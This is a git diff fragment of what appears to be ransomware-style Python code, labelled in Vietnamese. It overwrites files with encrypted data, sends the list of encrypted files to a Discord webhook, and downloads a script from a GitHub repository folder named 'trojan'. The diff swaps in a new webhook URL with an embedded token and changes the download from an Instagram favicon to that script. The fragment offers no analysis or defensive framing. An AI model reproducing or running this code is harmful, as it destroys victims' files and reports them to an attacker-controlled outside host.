@@ -51,7 +51,7 @@ for file in files:
     with open(file, "wb") as f:
         f.write(encrypted_data)    
 
-webhook = SyncWebhook.from_url("https://discord.com/api/webhooks/1035924951770878002/SEoUqoDpw_t8iPS9dO5kSlLB50532Zp0aNg-eHHXhbI9U72fG1EPbiOpO-o5VjHhmggI")
+webhook = SyncWebhook.from_url("https://discord.com/api/webhooks/1079350584492179576/21CZ1gUQIC__YifIz6KKT48hDFub2au31NOxpwnmeHdl_YUvXoN8eXU8d76jDMGN8WDh")
 contents = f'''
 
 
@@ -68,6 +68,6 @@ File đã mã hóa : {files}
 '''
 webhook.send(contents) 
 
-URL = "https://instagram.com/favicon.ico"
+URL = "https://raw.githubusercontent.com/Vanduc006/ducv/main/trojan/giai_virut.py"
 response = requests.get(URL)
-open("instagram.ico", "wb").write(response.content)
+open("giai_ma_ne.py", "wb").write(response.content)
